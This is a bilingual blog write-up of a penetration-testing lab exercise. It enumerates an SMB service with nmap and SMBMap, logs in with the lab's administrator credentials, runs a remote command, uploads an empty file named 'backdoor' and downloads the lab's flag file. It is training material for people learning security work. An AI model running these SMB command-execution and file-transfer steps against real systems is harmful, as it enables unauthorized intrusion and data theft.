---
layout: post
title: "SMB SMBMap"
date: "2022-08-18"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Assessment Methodologies
    - Enumeration
---

# SMB: SMBMap
[SMBMap](https://github.com/ShawnDEvans/smbmap)

```
Target IP Address: 10.4.26.58
ping 10.4.26.58
```

```
nmap 10.4.26.58
Starting Nmap 7.91 ( https://nmap.org ) at 2022-08-16 13:45 IST
Nmap scan report for 10.4.26.58
Host is up (0.0030s latency).
Not shown: 992 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 2.59 seconds
```

```
nmap -p445 --script smb-protocols 10.4.26.58

Starting Nmap 7.91 ( https://nmap.org ) at 2022-08-16 13:48 IST
Nmap scan report for 10.4.26.58
Host is up (0.0033s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2.02
|     2.10
|     3.00
|_    3.02

Nmap done: 1 IP address (1 host up) scanned in 6.49 seconds
```

```
Main arguments:
-u USERNAME           Username, if omitted null session assumed
-p PASSWORD           Password or NTLM hash
-d DOMAIN             Domain name (default WORKGROUP)
-H HOST               IP of host
Command Execution:
  Options for executing commands on the specified host

  -x COMMAND            Execute a command ex. 'ipconfig /all'
Shard drive Search:
  Options for searching/enumerating the share of the specified host(s)

  -L                    List all drives on the specified host, requires ADMIN rights.
 -r [PATH]         List contents of directory, default is to list root of all shares, ex. -r 'C$\Documents and Settings\Administrator\Documents'

Filesystem interaction:
  Options for interacting with the specified host's filesystem

  --download PATH       Download a file from the remote system, ex.'C$\temp\passwords.txt'
  --upload SRC DST      Upload a file to the remote system ex. '/tmp/payload.exe C$\temp\payload.exe'
```

```
主要参数：
-u USERNAME 用户名，如果省略，则假定为空会话
-p PASSWORD 密码或 NTLM 哈希
-d DOMAIN 域名（默认 WORKGROUP）
-H HOST 主机IP
命令执行：
  在指定主机上执行命令的选项

  -x COMMAND 执行命令 ex。 'ipconfig /all'
硬盘搜索：
  用于搜索/枚举指定主机的共享的选项

  -L 列出指定主机上的所有驱动器，需要管理员权限。
 -r [PATH] 列出目录的内容，默认列出所有共享的根目录，例如。 -r 'C$\Documents and Settings\Administrator\Documents'

文件系统交互：
  与指定主机的文件系统交互的选项

  --download PATH 从远程系统下载文件，例如'C$\temp\passwords.txt'
  --upload SRC DST 将文件上传到远程系统 ex。 '/tmp/payload.exe C$\temp\payload.exe'
```

```
smbmap -u guest -p "" -d . -H 10.4.26.58
```

```
smbmap -u administrator -p smbserver_771 -d . -H 10.4.26.58
```

```
smbmap -H 10.4.26.58 -u administrator -p smbserver_771 -x 'ipconfig'
```

```
smbmap -H 10.4.26.58 -u Administrator -p 'smbserver_771' -L
```

```
smbmap -H 10.4.26.58 -u Administrator -p 'smbserver_771' -r 'C$'
```

```
ls
touch backdoor
ls
```

```
smbmap -H 10.4.26.58 -u Administrator -p 'smbserver_771' --upload '/root/backdoor' 'C$\backdoor'
```

```
smbmap -H 10.4.26.58 -u Administrator -p 'smbserver_771' -r 'C$'
```

```
smbmap -H 10.4.26.58 -u Administrator -p 'smbserver_771' --download 'C$\flag.txt'
```

```
ls
cat 10.4.26.58-C_flag.txt
```

# Windows侦查：SMBMap
## 概述
为您提供了一台 Kali GUI 机器和一台运行 SMB 服务的目标机器。目标机器的 IP 地址在 Kali 机器桌面 (/root/Desktop/target) 上名为 target 的文本文件中提供。 
你的任务是使用 Kali 机器上可用的工具对服务进行指纹识别，并运行 smbmap 工具来枚举目标机器服务。

[SMBMap](https://github.com/ShawnDEvans/smbmap)：
* 允许用户枚举 samba 共享
* 允许文件上传/下载/删除
* 权限枚举（可写共享，满足 Metasploit）
* 等等
Objective: 使用 smbmap 工具枚举目标机器 SMB 服务并发现标志。
以下用户名和密码可用于访问服务：
`| 用户名 | 密码 | |administrator | smbserver_771 |`
说明： 
* 你的 Kali 机器有一个 IP 地址为 10.10.X.Y 的接口 运行“ip addr”来知道 X 和 Y 的值。 
* 目标机器的 IP 地址在文件“/root/Desktop/target”中提到* 不要攻击位于 IP 地址 192.V.W.1 和 10.10.X.1 的网关

## 我自己的思路
```
Target IP Address : 10.0.21.161
```

```
root@attackdefense:~# ping -c 4 10.0.21.161
PING 10.0.21.161 (10.0.21.161) 56(84) bytes of data.
64 bytes from 10.0.21.161: icmp_seq=1 ttl=125 time=4.36 ms
64 bytes from 10.0.21.161: icmp_seq=2 ttl=125 time=3.71 ms
64 bytes from 10.0.21.161: icmp_seq=3 ttl=125 time=3.97 ms
64 bytes from 10.0.21.161: icmp_seq=4 ttl=125 time=3.77 ms

--- 10.0.21.161 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 3.714/3.954/4.362/0.253 ms

```

```
root@attackdefense:~# nmap 10.0.21.161
Starting Nmap 7.91 ( https://nmap.org ) at 2022-08-18 07:01 IST
Nmap scan report for 10.0.21.161
Host is up (0.0040s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49165/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 1.57 seconds

```

```
root@attackdefense:~# nmap -p445 --script smb-protocols 10.0.21.161
Starting Nmap 7.91 ( https://nmap.org ) at 2022-08-18 07:03 IST
Nmap scan report for 10.0.21.161
Host is up (0.0034s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2.02
|     2.10
|     3.00
|_    3.02

Nmap done: 1 IP address (1 host up) scanned in 6.54 seconds
```

```
root@attackdefense:~# smbmap -u guest -p "" -d . -H 10.0.21.161
[+] Guest session   	IP: 10.0.21.161:445	Name: 10.0.21.161                                       
        Disk                                                  	PermissionsComment
	----                                                  	------------------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C                                                 	NO ACCESS	
	C$                                                	NO ACCESS	Default share
	D$                                                	NO ACCESS	Default share
	Documents                                         	NO ACCESS	
	Downloads                                         	NO ACCESS	
	IPC$                                              	READ ONLY	Remote IPC
	print$                                            	READ ONLY	Printer Drivers

```

```
root@attackdefense:~# smbmap -u administrator -p smbserver_771 -d . -H 10.0.21.161
[+] IP: 10.0.21.161:445	Name: 10.0.21.161                                       
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	READ, WRITE	Remote Admin
	C                                                 	READ ONLY	
	C$                                                	READ, WRITE	Default share
	D$                                                	READ, WRITE	Default share
	Documents                                         	READ ONLY	
	Downloads                                         	READ ONLY	
	IPC$                                              	READ ONLY	Remote IPC
	print$                                            	READ, WRITE	Printer Drivers

```

```
root@attackdefense:~# smbmap -H 10.0.21.161 -u administrator -p smbserver_771 -x 'ipconfig'
                                
Windows IP Configuration


Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  . : ap-southeast-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::5013:53ea:8ebf:e1bb%12
   IPv4 Address. . . . . . . . . . . : 10.0.21.161
   Subnet Mask . . . . . . . . . . . : 255.255.240.0
   Default Gateway . . . . . . . . . : 10.0.16.1

Tunnel adapter isatap.ap-southeast-1.compute.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : ap-southeast-1.compute.internal

```

```
root@attackdefense:~# smbmap -H 10.0.21.161 -u administrator -p smbserver_771 -L
[+] Host 10.0.21.161 Local Drives: C:\ D:\
[+] Host 10.0.21.161 Net Drive(s):
	No mapped network drives

```

```
root@attackdefense:~# smbmap -H 10.0.21.161 -u administrator -p smbserver_771 -r 'C$'
[+] IP: 10.0.21.161:445	Name: 10.0.21.161                                       
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	C$                                                	READ, WRITE	
	.\C$\*
	dr--r--r--                0 Sat Sep  5 13:26:00 2020	$Recycle.Bin
	fw--w--w--           398356 Wed Aug 12 10:47:41 2020	bootmgr
	fr--r--r--                1 Wed Aug 12 10:47:40 2020	BOOTNXT
	dr--r--r--                0 Wed Aug 12 10:47:41 2020	Documents and Settings
	fr--r--r--               32 Mon Dec 21 21:27:10 2020	flag.txt
	fr--r--r--       8589934592 Thu Aug 18 06:58:14 2022	pagefile.sys
	dr--r--r--                0 Wed Aug 12 10:49:32 2020	PerfLogs
	dw--w--w--                0 Wed Aug 12 10:49:32 2020	Program Files
	dr--r--r--                0 Sat Sep  5 14:35:45 2020	Program Files (x86)
	dr--r--r--                0 Sat Sep  5 14:35:45 2020	ProgramData
	dr--r--r--                0 Sat Sep  5 09:16:57 2020	System Volume Information
	dw--w--w--                0 Sat Dec 19 11:14:55 2020	Users
	dr--r--r--                0 Thu Aug 18 07:12:36 2022	Windows

```

```
root@attackdefense:~# smbmap -H 10.0.21.161 -u administrator -p smbserver_771 --upload '/root/backdoor' 'C$\backdoor'
[+] Starting upload: /root/backdoor (0 bytes)
[+] Upload complete
```

```
root@attackdefense:~# smbmap -H 10.0.21.161 -u administrator -p smbserver_771 -r 'C$'
[+] IP: 10.0.21.161:445	Name: 10.0.21.161                                       
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	C$                                                	READ, WRITE	
	.\C$\*
	dr--r--r--                0 Sat Sep  5 13:26:00 2020	$Recycle.Bin
	fr--r--r--                0 Thu Aug 18 07:26:20 2022	backdoor
	fw--w--w--           398356 Wed Aug 12 10:47:41 2020	bootmgr
	fr--r--r--                1 Wed Aug 12 10:47:40 2020	BOOTNXT
	dr--r--r--                0 Wed Aug 12 10:47:41 2020	Documents and Settings
	fr--r--r--               32 Mon Dec 21 21:27:10 2020	flag.txt
	fr--r--r--       8589934592 Thu Aug 18 06:58:14 2022	pagefile.sys
	dr--r--r--                0 Wed Aug 12 10:49:32 2020	PerfLogs
	dw--w--w--                0 Wed Aug 12 10:49:32 2020	Program Files
	dr--r--r--                0 Sat Sep  5 14:35:45 2020	Program Files (x86)
	dr--r--r--                0 Sat Sep  5 14:35:45 2020	ProgramData
	dr--r--r--                0 Sat Sep  5 09:16:57 2020	System Volume Information
	dw--w--w--                0 Sat Dec 19 11:14:55 2020	Users
	dr--r--r--                0 Thu Aug 18 07:12:36 2022	Windows

```

```
oot@attackdefense:~# smbmap -H 10.0.21.161 -u administrator -p smbserver_771 --download 'C$\flag.txt'
[+] Starting download: C$\flag.txt (32 bytes)
[+] File output to: /root/10.0.21.161-C_flag.txt
root@attackdefense:~# cat /root/10.0.21.161-C_flag.txt
25f492dbef8453cdca69a173a75790f0
```

## 解决方案
此实验室的解决方案可在以下手册中找到：https://assets.ine.com/labs/ad-manuals/walkthrough-2221.pdf

